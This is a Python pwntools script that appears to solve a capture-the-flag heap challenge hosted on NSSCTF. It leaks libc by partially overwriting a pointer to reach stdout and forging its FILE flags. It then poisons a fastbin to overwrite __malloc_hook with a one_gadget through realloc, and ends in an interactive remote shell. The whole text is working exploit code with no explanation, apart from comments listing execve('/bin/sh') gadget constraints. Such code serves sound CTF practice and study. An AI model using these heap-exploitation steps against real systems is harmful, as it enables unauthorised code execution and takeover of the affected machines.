from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node4.anna.nssctf.cn",28714)
# io=process("./pwn")
elf=ELF("./pwn")
libc=ELF("./libc-2.23.so")

def add(n,s):
    io.sendlineafter(">> \n","1")
    io.sendlineafter("index:\n",str(n))
    io.sendlineafter(b"size:\n",str(s))
    
def delete(n):
    io.sendlineafter(">> \n","2")
    io.sendlineafter("index:\n",str(n))
    
def edit(n,cc):
    io.sendlineafter(">> \n","3")
    io.sendlineafter("index:\n",str(n))
    io.sendlineafter(b"context:\n",cc)
    
def mg():
    io.sendlineafter(">> \n","666")

# gdb.attach(io)
# pause()

mg()
io.recvuntil(b"0x")
low_bytes=int(io.recv(6),16)
print("low bytes: "+hex(low_bytes))
stdout=low_bytes+0x36fe10
print("stdout: "+hex(stdout))

add(0,0x60)
add(1,0x90)
add(2,0x60)
add(3,0x60)

delete(1)
add(4,0x60)
edit(4,p64(stdout-0x43)[:3])
delete(0)
delete(2)
edit(2,b"\x70")

add(5,0x60)
add(6,0x60)
add(7,0x60)

payload=b"\x00"*0x33+p64(0xfbad1887)+p64(0)*3+b"\x00"
edit(7,payload)
leak_addr=u64(io.recvuntil(b"\x7f")[-6:].ljust(8,b"\x00"))-192-libc.sym[b"_IO_2_1_stderr_"]
print("leak addr: "+hex(leak_addr))

malloc_hook=leak_addr+libc.sym[b"__malloc_hook"]
realloc=leak_addr+libc.sym[b"__libc_realloc"]
one_gadget=[0x45226,0x4527a,0xf03a4,0xf1247]
shell=leak_addr+one_gadget[1]

add(8,0x60)
delete(3)
edit(3,p64(malloc_hook-0x23))
add(9,0x60)
add(10,0x60)
edit(10,cyclic(0xb)+p64(shell)+p64(realloc+0xc))

delete(9)
add(9,0x60)

io.interactive()

# 0x45226 execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4527a execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf03a4 execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1247 execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL

